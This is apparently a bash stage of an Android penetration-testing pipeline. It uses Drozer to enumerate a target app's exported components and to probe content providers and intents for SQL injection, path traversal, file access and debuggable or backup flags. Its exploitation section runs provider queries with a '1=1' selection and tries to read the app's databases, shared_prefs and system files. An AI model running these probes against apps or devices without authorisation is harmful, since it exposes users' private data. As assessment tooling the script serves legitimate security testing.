#!/usr/bin/env bash
PIPELINE_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
# 03_dynamic_drozer.sh - Drozer enumeration + exploitation (proper)
PROFILE_PHASE="03_dynamic_drozer"
source "$PIPELINE_ROOT/lib/common.sh"
source "$PIPELINE_ROOT/lib/findings.sh"

PKG="$(tget apk package_name)"
[ -z "$PKG" ] && { err "No package_name in config"; exit 1; }

cd "$RUN_DIR" || exit 1
info "Drozer testing on $PKG"

DROZER_DIR="$RUN_DIR/drozer"
mkdir -p "$DROZER_DIR"

# ---- 1. Start drozer server on device ----
info "Starting drozer server on device..."
adb shell "am startservice -n com.mwr.example.sieve/com.mwr.example.sieve.MainService" 2>/dev/null || \
adb shell "am startservice com.mwr.dz/.services.ServerService" 2>/dev/null || true
sleep 3

# ---- 2. Forward drozer port ----
info "Forwarding drozer port (31415)..."
adb forward tcp:31415 tcp:31415 2>/dev/null
sleep 2

# ---- 3. Helper: run drozer command via piped input ----
drozer_cmd() {
  local cmd="$1"
  local outfile="${2:-/dev/null}"
  echo "$cmd" | drozer console connect 2>/dev/null > "$outfile"
}

drozer_cmds() {
  # Run multiple commands piped together
  local outfile="${1:-/dev/null}"
  shift
  printf '%s\n' "$@" | drozer console connect 2>/dev/null > "$outfile"
}

# ---- 4. Check drozer connectivity ----
info "Testing drozer connection..."
drozer_cmd "list" "$DROZER_DIR/all_modules.txt"

if ! grep -q "app\.\|scanner\.\|shell\." "$DROZER_DIR/all_modules.txt" 2>/dev/null; then
  warn "Drozer not reachable. Start drozer server on device first."
  warn "Manual: adb shell am startservice com.mwr.dz/.services.ServerService"
  warn "Or install drozer agent APK on device"
  # Continue anyway — some modules may work
fi

ok "Drozer modules available: $(wc -l < "$DROZER_DIR/all_modules.txt" 2>/dev/null || echo 0)"

# ============================================================
# PHASE A: Enumeration
# ============================================================
info "=== Phase A: Enumeration ==="

# A1. Package info
drozer_cmd "run app.package.info -a $PKG" "$DROZER_DIR/package_info.txt"
info "Package info extracted"

# A2. Manifest
drozer_cmd "run app.package.manifest $PKG" "$DROZER_DIR/manifest.txt"
info "Manifest extracted"

# A3. Activities
drozer_cmd "run app.activity.info -a $PKG" "$DROZER_DIR/activities.txt"
EXPORTED_ACT=$(grep -c "exported=true" "$DROZER_DIR/activities.txt" 2>/dev/null || echo 0)
info "Activities exported: $EXPORTED_ACT"

# A4. Services
drozer_cmd "run app.service.info -a $PKG" "$DROZER_DIR/services.txt"
EXPORTED_SVC=$(grep -c "exported=true" "$DROZER_DIR/services.txt" 2>/dev/null || echo 0)
info "Services exported: $EXPORTED_SVC"

# A5. Content Providers
drozer_cmd "run app.provider.info -a $PKG" "$DROZER_DIR/providers.txt"
EXPORTED_PROV=$(grep -c "exported=true" "$DROZER_DIR/providers.txt" 2>/dev/null || echo 0)
info "Providers exported: $EXPORTED_PROV"

# A6. Broadcast Receivers
drozer_cmd "run app.broadcast.info -a $PKG" "$DROZER_DIR/receivers.txt"
EXPORTED_BR=$(grep -c "exported=true" "$DROZER_DIR/receivers.txt" 2>/dev/null || echo 0)
info "Receivers exported: $EXPORTED_BR"

# A7. Find providers via content discovery
drozer_cmd "run app.provider.find -a $PKG" "$DROZER_DIR/provider_uris.txt"

# ============================================================
# PHASE B: Content Provider Exploitation
# ============================================================
info "=== Phase B: Content Provider Testing ==="

# B1. Enumerate provider content URIs
drozer_cmd "run app.provider.query content://$PKG/" "$DROZER_DIR/prov_root_query.txt"

# B2. Try common URI patterns
for uri in \
  "content://$PKG/providers" \
  "content://$PKG/users" \
  "content://$PKG/user" \
  "content://$PKG/accounts" \
  "content://$PKG/data" \
  "content://$PKG/config" \
  "content://$PKG/settings" \
  "content://$PKG/notes" \
  "content://$PKG/contacts" \
  "content://$PKG/files"; do
  drozer_cmd "run app.provider.query $uri" "$DROZER_DIR/prov_$(echo "$uri" | md5sum | cut -c1-8).txt" 2>/dev/null || true
done

# B3. SQL Injection detection (proper module)
drozer_cmd "run scanner.provider.injection -a $PKG" "$DROZER_DIR/sqli_scan.txt"
if grep -qi "vulnerable\|injection" "$DROZER_DIR/sqli_scan.txt" 2>/dev/null; then
  warn "SQL injection vulnerability detected!"
  fadd "SQL injection in content provider" HIGH HIGH CWE-89 "A03:2021" "$DROZER_DIR/sqli_scan.txt"
fi

# B4. File access via providers
drozer_cmd "run scanner.provider.file -a $PKG" "$DROZER_DIR/file_access.txt"
if grep -qi "read\|write\|access" "$DROZER_DIR/file_access.txt" 2>/dev/null; then
  warn "File access via content provider"
  fadd "Content provider file access" HIGH HIGH CWE-22 "A01:2021" "$DROZER_DIR/file_access.txt"
fi

# B5. Blob access (large object extraction)
drozer_cmd "run scanner.provider.blob -a $PKG" "$DROZER_DIR/blob_access.txt"

# ============================================================
# PHASE C: Intent & Component Exploitation
# ============================================================
info "=== Phase C: Intent & Component Testing ==="

# C1. Activity start (non-exported activities via intent)
drozer_cmd "run app.activity.start --component $PKG com.mwr.example.sieve.LoginActivity" \
  "$DROZER_DIR/activity_start.txt" 2>/dev/null || true

# C2. Broadcast injection
drozer_cmd "run app.broadcast.send --component $PKG --action android.intent.action.BOOT_COMPLETED" \
  "$DROZER_DIR/broadcast_send.txt" 2>/dev/null || true

# C3. Service abuse
drozer_cmd "run app.service.send --component $PKG com.mwr.example.sieve.MainService --extra string password test" \
  "$DROZER_DIR/service_send.txt" 2>/dev/null || true

# C4. Intent URI launch
drozer_cmd "run app.intent.send --action android.intent.action.VIEW --data-uri 'file:///etc/hosts'" \
  "$DROZER_DIR/intent_send.txt" 2>/dev/null || true

# ============================================================
# PHASE D: Scanner Modules
# ============================================================
info "=== Phase D: Security Scanners ==="

# D1. Debuggable check
drozer_cmd "run app.package.debuggable $PKG" "$DROZER_DIR/debuggable.txt"
if grep -qi "true\|debuggable" "$DROZER_DIR/debuggable.txt" 2>/dev/null; then
  warn "App is debuggable"
  fadd "App is debuggable (drozer)" HIGH CERTAIN CWE-215 "A05:2021" "$DROZER_DIR/debuggable.txt"
fi

# D2. Backup mode
drozer_cmd "run app.package.backup $PKG" "$DROZER_DIR/backup.txt"
if grep -qi "true\|allowed" "$DROZER_DIR/backup.txt" 2>/dev/null; then
  warn "Backup is enabled"
  fadd "Backup enabled (drozer)" MEDIUM CERTAIN CWE-212 "A04:2021" "$DROZER_DIR/backup.txt"
fi

# D3. Certificate pinning
drozer_cmd "run app.package.certificate $PKG" "$DROZER_DIR/certificate.txt"

# D4. Shell access test
drozer_cmd "run shell.id" "$DROZER_DIR/shell_id.txt"

# D5. File permissions
drozer_cmd "run shell.call /system/bin/id" "$DROZER_DIR/shell_call.txt"

# ============================================================
# PHASE E: Exploitation Attempts
# ============================================================
info "=== Phase E: Exploitation ==="

# E1. Content provider injection with selection
drozer_cmd "run app.provider.query content://$PKG/ --where '1=1'" "$DROZER_DIR/prov_injection.txt" 2>/dev/null || true

# E2. Path traversal
drozer_cmd "run scanner.provider.traversal -a $PKG" "$DROZER_DIR/traversal.txt"
if grep -qi "traversal\|\.\./" "$DROZER_DIR/traversal.txt" 2>/dev/null; then
  warn "Path traversal possible"
  fadd "Path traversal via content provider" HIGH HIGH CWE-22 "A01:2021" "$DROZER_DIR/traversal.txt"
fi

# E3. Read sensitive files via providers
for f in "/data/data/$PKG/shared_prefs" "/data/data/$PKG/databases" "/data/data/$PKG/files" "/etc/hosts" "/proc/version"; do
  drozer_cmd "run app.provider.read --uri content://$PKG/$f" "$DROZER_DIR/read_$(echo "$f" | md5sum | cut -c1-8).txt" 2>/dev/null || true
done

# ============================================================
# PHASE F: Analyze Results
# ============================================================
info "=== Phase F: Analysis ==="

# Exported components summary
{
  echo "=== Exported Components ==="
  echo ""
  echo "Activities ($EXPORTED_ACT exported):"
  grep "exported=true" "$DROZER_DIR/activities.txt" 2>/dev/null | head -20
  echo ""
  echo "Services ($EXPORTED_SVC exported):"
  grep "exported=true" "$DROZER_DIR/services.txt" 2>/dev/null | head -20
  echo ""
  echo "Providers ($EXPORTED_PROV exported):"
  grep "exported=true" "$DROZER_DIR/providers.txt" 2>/dev/null | head -20
  echo ""
  echo "Receivers ($EXPORTED_BR exported):"
  grep "exported=true" "$DROZER_DIR/receivers.txt" 2>/dev/null | head -20
} > "$DROZER_DIR/exported_summary.txt"

# Create findings
[ "$EXPORTED_ACT" -gt 0 ] && fadd "$EXPORTED_ACT exported activities (drozer)" MEDIUM CERTAIN CWE-284 "A01:2021" "$DROZER_DIR/activities.txt"
[ "$EXPORTED_SVC" -gt 0 ] && fadd "$EXPORTED_SVC exported services (drozer)" MEDIUM CERTAIN CWE-284 "A01:2021" "$DROZER_DIR/services.txt"
[ "$EXPORTED_PROV" -gt 0 ] && fadd "$EXPORTED_PROV exported providers (drozer)" MEDIUM CERTAIN CWE-284 "A01:2021" "$DROZER_DIR/providers.txt"
[ "$EXPORTED_BR" -gt 0 ] && fadd "$EXPORTED_BR exported receivers (drozer)" LOW CERTAIN CWE-284 "A01:2021" "$DROZER_DIR/receivers.txt"

# Clean up
adb forward --remove tcp:31415 2>/dev/null || true

ok "Drozer testing complete -> $DROZER_DIR"
fsnapshot
